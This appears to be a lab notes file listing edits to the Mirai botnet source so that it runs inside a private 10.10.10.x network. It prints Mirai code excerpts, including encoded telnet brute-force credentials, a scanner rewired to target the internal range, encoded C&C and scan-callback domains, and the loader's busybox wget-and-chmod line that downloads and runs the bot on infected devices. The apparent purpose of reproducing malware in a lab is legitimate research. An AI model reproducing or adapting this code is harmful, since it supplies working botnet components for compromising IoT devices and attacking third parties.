
# Mirai Source Code Changes

## cnc Folder

### main.go
Change this depending on the database information

#### line 10-13
```
const DatabaseAddr string   = "127.0.0.1"
const DatabaseUser string   = "root"
const DatabasePass string   = "root"
const DatabaseTable string  = "mirai"
```

## bot Folder

### main.c
The source code comments out the the initialization of the scanner when
in DEBUG mode. In order to have the scanner run properly, the #ifndef has
been commented out.

#### line 158-163
```
//#ifndef DEBUG
#ifdef MIRAI_TELNET
    printf("[scanner] init\n");
    scanner_init();
#endif
//#endif
```

### resolv.c

The IP address must be changed to the DNS Server address.

#### line 84
```
util_zero(&addr, sizeof (struct sockaddr_in));
addr.sin_family = AF_INET;
addr.sin_addr.s_addr = INET_ADDR(10,10,10,5);
addr.sin_port = htons(53);
```

### scanner.c

In order to shorten the time it takes to brute force the victim,
all usernames and passwords except the correct ones were commented out

#### line 136-140
```	
add_auth_entry("\x50\x4D\x4D\x56", "", 4);                                              // root     (none)
add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51\x55\x4D\x50\x46", 4);          // admin    password*/
add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56", 4);                              // root     root
/*add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17", 4);                          // root     12345
add_auth_entry("\x57\x51\x47\x50", "\x57\x51\x47\x50", 3);                              // user     user
```

In order to shorten the time it takes to find the device, the first 3 parts
of the ip address were changed into 10


#### line 693-699

```	
o1 = tmp & 0xff;
o2 = (tmp >> 8) & 0xff;
o3 = (tmp >> 16) & 0xff;
o4 = (tmp >> 24) & 0xff;
o1 = 10;
o2 = 10;
o3 = 10;
```

The source code prevents internal looping, but in order to run mirai inside
the internal network, line 706 has been commented out


#### line 701-712

```	
 while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
          //(o1 == 10) ||                             // 10.0.0.0/8       - Internal network
          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
```

### table.c 

The CNC server domain name (line 18) and the Scan Listen server (line 21) domain 
name have been changed to the correct ones


#### line 18-22
```
add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x50\x16\x4C\x46\x12\x4F\x0C\x4F\x47\x22", 14); // cnc.r4nd0m.me
    add_entry(TABLE_CNC_PORT, "\x22\x35", 2);   // 23

    add_entry(TABLE_SCAN_CB_DOMAIN, "\x4C\x51\x13\x0C\x50\x16\x4C\x46\x12\x4F\x0C\x4F\x47\x22", 14); // ns1.r4nd0m.me
    add_entry(TABLE_SCAN_CB_PORT, "\x99\xC7", 2);         // 48101
```

### util.c

The IP address must be changed to the DNS Server address.

#### line 249-251
```
addr.sin_family = AF_INET;
addr.sin_addr.s_addr = INET_ADDR(10,10,10,5);
addr.sin_port = htons(53);
```

## loader/src Folder

### main.c
The IP address must be changed to the Apache Server Address

#### line 53-57
```
if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "10.10.10.5", 80, "10.10.10.5")) == NULL)
    {
        printf("Failed to initialize server. Aborting\n");
        return 1;
    }
```

### server.c

In order to run in debug mode, the loader must be configured to load in
mirai.dbg instead of the actual architecture (.x86). Therefore line 452-455
have been added and line 457-458 have been commented to only run in release
mode.


#### line 452-459
```

#ifdef DEBUG
				    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/bins/%s.%s -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                                                    wrker->srv->wget_host_ip, wrker->srv->wget_host_port, "mirai", "dbg");
#endif
#ifndef DEBUG
                                    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/bins/%s.%s -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                                                    wrker->srv->wget_host_ip, wrker->srv->wget_host_port, "mirai", conn->info.arch);
#endif
```


